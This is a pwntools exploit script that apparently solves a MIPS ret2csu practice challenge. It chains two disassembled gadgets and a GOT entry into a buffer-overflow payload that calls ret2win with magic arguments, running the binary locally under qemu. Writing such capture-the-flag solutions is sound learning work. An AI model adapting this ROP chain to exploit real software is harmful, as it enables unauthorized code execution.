from pwn import *
#io = process("qemu-mipsel -g 1024 -L /usr/mipsel-linux-gnu write4_mipsel",shell=True)
io = process("qemu-mipsel -L /usr/mipsel-linux-gnu ret2csu_mipsel",shell=True)
"""
           0x004009c0      3400bf8f       lw ra, (var_34h)
           0x004009c4      3000b58f       lw s5, (var_30h)
           0x004009c8      2c00b48f       lw s4, (var_2ch)
           0x004009cc      2800b38f       lw s3, (var_28h)
           0x004009d0      2400b28f       lw s2, (var_24h)
           0x004009d4      2000b18f       lw s1, (var_20h)
           0x004009d8      1c00b08f       lw s0, (var_1ch)
           0x004009dc      0800e003       jr ra
"""
load_s_regs = 0x004009c0

"""
      0x004009a0      0000198e       lw t9, (s0)                 
      0x004009a4      01003126       addiu s1, s1, 1
      0x004009a8      2530a002       move a2, s5
      0x004009ac      25288002       move a1, s4
      0x004009b0      09f82003       jalr t9
      0x004009b4      25206002       move a0, s3
      0x004009b8      f9ff5116       bne s2, s1, 0x4009a0
"""
win_gadget = 0x004009a0 

ret2win_GOT_JMP_SLOT = 0x00411058

payload = b""
payload += b"A"*36
payload += p32(load_s_regs)
payload += p32(0) * 7                                   # offset
payload += p32(ret2win_GOT_JMP_SLOT)                    # $s0
payload += p32(0)                                       # $s1
payload += p32(0)                                       # $s2
payload += p32(0xdeadbeef)                              # $s3
payload += p32(0xcafebabe)                              # $s4
payload += p32(0xd00df00d)                              # $s5
payload += p32(win_gadget)                              # $ra

io.send(payload)
io.interactive()
